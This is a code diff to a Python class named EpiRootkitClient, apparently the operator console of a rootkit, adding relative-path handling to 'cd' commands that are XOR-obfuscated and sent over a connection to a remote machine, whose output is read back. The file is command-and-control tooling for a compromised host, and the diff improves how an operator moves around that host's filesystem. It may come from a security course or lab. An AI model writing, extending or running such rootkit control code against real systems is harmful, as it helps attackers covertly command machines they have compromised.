@@ -99,6 +99,9 @@ class EpiRootkitClient:
                 path = cmd[4:].strip() if cmd.startswith("!cd ") else ""
                 if not path:
                     path = "~"  # Default to home directory if no path specified
+                elif not path.startswith('/') and self.remote_dir != '/':
+                    # Handle relative paths - if path doesn't start with / and we're not at root
+                    path = f"{self.remote_dir}/{path}"
                 test_cmd = f"cd {path} && pwd"
                 conn.sendall(xor_encrypt_decrypt(test_cmd.encode()))
                 result = self._receive_output(conn)
@@ -115,6 +118,9 @@ class EpiRootkitClient:
                 path = cmd[3:].strip() if cmd.startswith("cd ") else ""
                 if not path:
                     path = "~"  # Default to home directory if no path specified
+                elif not path.startswith('/') and self.remote_dir != '/':
+                    # Handle relative paths - if path doesn't start with / and we're not at root
+                    path = f"{self.remote_dir}/{path}"
                 test_cmd = f"cd {path} && pwd"
                 conn.sendall(xor_encrypt_decrypt(test_cmd.encode()))
                 result = self._receive_output(conn)
